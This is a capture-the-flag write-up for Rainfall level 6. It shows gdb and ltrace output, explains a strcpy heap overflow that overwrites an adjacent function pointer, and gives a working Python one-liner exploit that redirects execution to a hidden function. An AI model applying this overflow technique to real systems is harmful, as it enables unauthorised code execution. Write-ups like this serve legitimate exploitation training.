# Rainfall - Level 6

## Executable Analyse

```assembly
(gdb) info function

0x08048454  n
0x08048468  m
0x0804847c  main
```

The main function use malloc to allocate two variables : 
- A string buffer of 64 char
- A function pointer

The function pointer is initialize with the address of the m function, which is executed and displays "Nope".  

The goal is to change the value of this pointer to the address of n, which when executed will display the password.  

## Heap overflow

The security breach relies on the use of `strcpy()` that copies a buffer with a potential infinite size in a buffer defined size. **#philosophy**

Note that dest and f are malloc on the head. Memory allocations are made one after the other on the heap. If we overflow dest, then we will reach f.

```shell
$> ltrace ./level6 abccd
malloc(64)                                                         = 0x0804a008
malloc(4)                                                          = 0x0804a050

$> python 
>>> int("0x0804a050", 16) - int("0x0804a008", 16)
72
```

The attack consists of overflowing the buffer with 72 ramdom characters and write the n() address

```shell
./level6 $(python -c 'print "A" *72 + "\x08\x04\x84\x54"[::-1]')
```